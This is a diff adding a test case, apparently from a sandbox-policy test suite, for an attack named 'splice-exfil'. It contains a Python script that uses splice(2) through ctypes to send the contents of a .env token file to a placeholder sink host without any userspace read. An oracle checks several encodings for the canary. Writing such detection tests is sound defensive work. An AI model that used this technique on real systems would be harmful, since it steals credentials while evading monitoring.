@@ -1,0 +1,36 @@
+# The `splice` variant of `sendfile-exfil`: splice(2) moves the secret file's
+# bytes into a pipe and on into the socket entirely in-kernel, with no
+# userspace read. One end of a splice must be a pipe, so the file-to-pipe
+# splice returns, and is recorded as a secret read, before the pipe-to-socket
+# splice is judged. Python 3.8 has no os.splice, so the calls go through
+# ctypes.
+name = "splice-exfil"
+kind = "attack"
+policy = "recommended"
+
+[[files]]
+path = ".env"
+contents = "TOKEN={CANARY}\n"
+
+[[files]]
+path = "sp.py"
+contents = """
+import ctypes, os, socket
+libc = ctypes.CDLL(None, use_errno=True)
+libc.splice.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_uint]
+libc.splice.restype = ctypes.c_ssize_t
+s = socket.socket()
+s.connect(("{SINK_HOST}", {SINK_PORT}))
+fd = os.open(".env", os.O_RDONLY)
+r, w = os.pipe()
+libc.splice(fd, None, w, None, 4096, 0)
+libc.splice(r, None, s.fileno(), None, 4096, 0)
+"""
+
+[[steps]]
+shell = 0
+run = "python3 sp.py"
+expect = "any"
+
+[oracle]
+encodings = ["raw", "base64", "hex"]
